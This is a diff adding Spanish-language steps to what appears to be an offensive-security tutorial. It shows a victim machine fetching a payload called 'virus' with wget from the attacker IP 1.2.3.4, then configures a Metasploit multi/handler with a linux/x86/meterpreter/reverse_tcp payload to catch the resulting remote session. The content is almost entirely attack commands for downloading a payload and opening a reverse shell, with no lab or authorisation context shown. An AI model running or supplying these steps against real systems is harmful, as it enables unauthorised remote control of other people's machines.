@@ -291,3 +291,44 @@ Desde la sesión activa en la máquina víctima, descarga el payload usando `wge
 wget http://1.2.3.4/virus
 ```
 
+### Configuración de Metasploit para Recibir la Sesión
+
+#### Paso 1: Iniciar el Handler en Metasploit
+
+Abre Metasploit y selecciona el módulo de handler:
+
+```bash
+use multi/handler
+```
+
+#### Paso 2: Verificar Opciones del Módulo
+
+Muestra las opciones del módulo seleccionado:
+
+```bash
+show options
+```
+
+#### Paso 3: Configuración del Payload
+
+Elige el payload de Meterpreter adecuado para Linux:
+
+```bash
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+```
+
+#### Paso 4: Configuración de Dirección IP
+
+Asigna la dirección IP de la máquina atacante:
+
+```bash
+set LHOST 1.2.3.4
+```
+
+#### Paso 5: Ejecutar el Handler
+
+Inicia el handler para recibir la sesión:
+
+```bash
+run
+```
